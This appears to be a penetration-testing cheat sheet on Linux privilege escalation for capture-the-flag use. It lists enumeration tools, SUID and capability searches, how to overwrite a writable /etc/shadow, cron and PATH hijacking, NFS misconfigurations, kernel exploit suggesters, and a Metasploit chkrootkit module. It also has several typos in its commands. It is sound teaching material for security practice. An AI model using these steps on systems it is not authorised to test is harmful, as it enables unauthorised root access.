# Linux - Privilege Escalation

## Linux Local Enum Scripts

### LinPeass

Copy the script on the HTTP server directory.

```
cp /usr/share/peass/linpeas/linpeas.sh .
```

Transfer the script on target and run it.

### LinEnum.sh

{% embed url="https://github.com/rebootuser/LinEnum" %}

1. Copy bash script in a file (LinEnum.sh)
2. upload file to target machine /temp dir through meterpreter (upload LinuEnum.sh)
3. run this commands in linux target machine (chmod +x LinEnum.sh && ./LinEnum.sh)

### pspy

{% embed url="https://github.com/DominicBreuker/pspy" %}

**pspy** is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs.

```bash
# download on kali machine
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32

# trasfer with python on a target

# run on target
chmod +x pspy32 && pspy32
```





## Juicy Dir

Check this directory to find something juicy

```
/opt/
```





## Groups

Check the groups user and, if there is no standard one, google it to find some information and futher actions to do with it.&#x20;

```bash
id
```



## Sudo

```bash
sudo -l
```

## SUIDs

<pre class="language-bash"><code class="lang-bash"># Check application with permission
find / type f -perm -04000 -ls 2>/dev/null
<strong>find / -perm -u=s -type f 2>/dev/null
</strong></code></pre>

### GTFObins

{% embed url="https://gtfobins.github.io/" %}

## Capabilities

```bash
# check application with capabilities
getcap -r / 2>/dev/null

# If there are cap_setuid capabilities, use application for change user uid.
```

## Permitions Check

```bash
# check file with write permision open
find / -not -type l -perm -o+w

# /etc/shadow writable, change a root password with SHA-512 hash
openssl passwd -6 -salt xyz YOURPASS
# elevate your privs without sudo 
su -
```

## Cron Jobs

```bash
cat /etc/crontab

# create or mod script in crontab
```



## PATH Variable Manipulation

```bash
vim gre    # Check the $PATH
echo $PATH

# check writable folders
find / -writable 2>/deb/null

# add writable folder in PATH
export PATH=/[$WR_FOLDER]:$PATH

# Create command script in writable folder for privEsc
# Run Script
```



## **NFS (Network File Share)**

```bash
cat /etc/exports
# Check if there is no_root_squash in NFS conf
```



## Kernel Exploit

```bash
# Identify the Kernel version 
uname -a

# Search an exploit code for the kernel version with Linux Exploit Suggester
# download the script .sh
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

# trasfer the script in the target
# run it
chmod +x lse.sh
./lse.sh

# READ EXPLOIT!!!
gcc explit.c -o exploit
```



## Metasploit PrivEsc

```bash
# view running program on target
ps aux
```

### CHKROOTKIT

```bash
service postgresql start && msfconsole

use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION N
set LHOST IP
exploit
```





